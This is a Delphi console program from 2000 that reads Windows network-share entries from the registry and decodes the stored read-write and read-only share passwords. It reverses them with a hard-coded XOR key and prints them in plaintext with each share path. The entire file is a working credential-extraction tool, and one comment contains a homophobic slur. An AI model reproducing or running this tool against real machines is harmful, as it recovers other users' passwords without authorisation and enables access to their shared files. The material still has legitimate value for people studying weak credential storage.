{ spe2.dpr - Extract share passwords from registry - Sigma <sigma@mail.com>
  See Readme.txt for more info
}

{$APPTYPE CONSOLE} // Tells delphi to compile this as a console app.
program spe2;

uses Windows, Classes, SysUtils, Consts, Registry;

var thereg : TRegistry;
    sn ,path : String;
    passwordstr1,passwordstr2,cracked1,cracked2 : string[8];
    wordlength1,wordlength2,y,x : longint;
    password1,password2 : array[1..8] of char;
    stringlist : TStringlist;

// This is the key with which the password is XORed. I didn't come up with it tho.
const key : array[1..8] of char =  #$35#$9a#$4d#$a6#$53#$a9#$d4#$6a;

// Return a string of spaces of the specified length.
function makepad(width : integer) : string;
var s : string;
    x : integer;
begin
     s := '';
     for x := 1 to width do
     s := s + ' ';
     makepad := s;
end;

// A ghay little function that converts one-character strings to chars.
function stringtochar(st : string) : char;
var c : char;
begin
     c := #0;
     while c <> st do
           c := succ(c);
     stringtochar := c;
end;

begin
     writeln;
     writeln(' +-----------------------------------------------+');
     writeln(' | SHARE PASSWORD EXTRACTOR  v2.0 (28/04/2000)   |');
     writeln(' | By: Sigma <sigma@mail.com>                    |');
     writeln(' | Based on BUGTRAQ post by: a42n8k9@redrose.net |');
     writeln(' +-----------------------------------------------+');
     writeln;
          //   123456789012345678901234567890123456789012345678901234567890
          //   ************  ********  ********  **************************
     writeln(' |Share name   |RW       |RO       |Share path');
     writeln(' ---------------------------------------------------------');
     stringlist := TStringlist.Create;  // Create a stringlist to store share names in
     thereg := TRegistry.Create; // Create a registry object
     with theReg do
     begin
          RootKey := HKEY_LOCAL_MACHINE; // Set the root key
          // open the key under which we find the share keys
          if OpenKey('\SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan', false) = true then
          begin
               if hassubkeys then // if there are shares
               begin
                    GetKeyNames(stringlist); //Get the share names into the stringlist

                    for y := 0 to stringlist.Count-1 do // Repeat for each share name stored in the stringlist
                    begin
                    sn := stringlist.Strings[y];
                    path :=  '\SOFTWARE\Microsoft\Windows\CurrentVersion\Network\LanMan\' + sn  ;
                    if OpenKey(path, false) = true then //open the share key (see above 2 lines)
                         begin
                              for x := 1 to 8 do
                              begin
                                   password1[x] := #0;
                                   password2[x] := #0;
                              end;

                              readbinarydata('Parm2enc',password2,8); // get cyphered RO password
                              readbinarydata('Parm1enc',password1,8); // get cyphered RW password

                              sn := sn + makepad(14 - length(sn));
                              write(' ',sn);   // Print the share name to the screen

                              x := 1;
                              passwordstr1 := '';
                              passwordstr2 := '';
                              cracked1 := '';
                              cracked2 := '';

                              while password1[x] <> #0 do
                              begin
                                   passwordstr1 := passwordstr1 + password1[x];
                                   inc(x);
                              end;
                              wordlength1 := length(passwordstr1);
                              x:=1;

                              while password2[x] <> #0 do
                              begin
                                   passwordstr2 := passwordstr2 + password2[x];
                                   inc(x);
                              end;
                              wordlength2 := length(passwordstr2);

                              for x := 1 to wordlength1 do // Here we do the XORing
                              begin
                                   if password1[x] <> #0 then
                                   cracked1 := cracked1 + chr(ord(stringtochar(copy(passwordstr1,x,1))) XOR ord(key[x]));
                              end;

                              for x := 1 to wordlength2 do // And again...
                              begin
                                   if password2[x] <> #0 then
                                   cracked2 := cracked2 + chr(ord(stringtochar(copy(passwordstr2,x,1))) XOR ord(key[x]));
                              end;

                              if cracked1 <> '' then // Write RO password to screen
                              write(cracked1,makepad(10 - length(cracked1)))
                              else write('-         ');

                              if cracked2 <> '' then // Write RW password to screen
                              write(cracked2,makepad(10 - length(cracked2)))
                              else write('-         ');

                              write(readstring('Path'));  // Get share path and write to screen
                              writeln;
                         end
                         else writeln('Error couldnt open key: ',stringlist.Strings[y]);
                    end;
               end;
          end;
     end;
end.
